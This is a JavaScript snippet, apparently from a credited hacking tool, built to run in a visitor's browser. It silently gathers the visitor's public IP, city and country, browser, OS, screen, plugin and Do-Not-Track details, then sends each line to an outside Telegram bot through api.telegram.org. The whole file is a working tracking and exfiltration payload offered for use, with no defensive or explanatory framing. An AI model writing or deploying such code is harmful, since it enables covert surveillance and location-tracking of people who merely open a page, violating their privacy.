

    const getIP = async () => {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
      } catch (error) {
        console.log(error);
      }
    };

    const getLocation = async () => {
      try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return `${data.city}, ${data.region}, ${data.country}`;
      } catch (error) {
        console.log(error);
      }
    };

    const getBrowserInfo = () => {
      const browserName = navigator.appName;
      const browserVersion = navigator.appVersion;
      const userAgent = navigator.userAgent;
      const platform = navigator.platform;
      const language = navigator.language;
      return `Browser Name: ${browserName}\nBrowser Version: ${browserVersion}\nUser Agent: ${userAgent}\nPlatform: ${platform}\nLanguage: ${language}`;
    };

    const getOsInfo = () => {
      const os = navigator.platform;
      const osVersion = navigator.oscpu;
      const language = navigator.language;
      return `Operating System: ${os}\nOperating System Version: ${osVersion}\nLanguage: ${language}`;
    };

    const getDeviceInfo = () => {
      const screenWidth = screen.width;
      const screenHeight = screen.height;
      const colorDepth = screen.colorDepth;
      const cookiesEnabled = navigator.cookieEnabled;
      const doNotTrack = navigator.doNotTrack;
      const plugins = Array.from(navigator.plugins, plugin => `${plugin.name} ${plugin.version}`);
      const mimeTypes = Array.from(navigator.mimeTypes, mimeType => `${mimeType.type}`);
      return `Screen Width: ${screenWidth}\nScreen Height: ${screenHeight}\nColor Depth: ${colorDepth}\nCookies Enabled: ${cookiesEnabled}\nDo Not Track: ${doNotTrack}\nPlugins: ${plugins}\nMime Types: ${mimeTypes}`;
    };

    Promise.all([getIP(), getLocation()])
      .then(([publicIP, location]) => {
        const browserInfo = getBrowserInfo();
        const osInfo = getOsInfo();
        const deviceInfo = getDeviceInfo();
        const message = `Location: ${location}\nPublic IP: ${publicIP}\n\n${browserInfo}\n\n${osInfo}\n\n${deviceInfo}`;
        console.log(message);
        const messageLines = message.split('\n');
        messageLines.forEach(line => {
          const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${line}`;
          fetch(url);
        });
      })
      .catch(error => console.log(error));

// Coded By 5mU7X
// FOr More Info Visit -> https://github.com/Whitecat18/javahexor


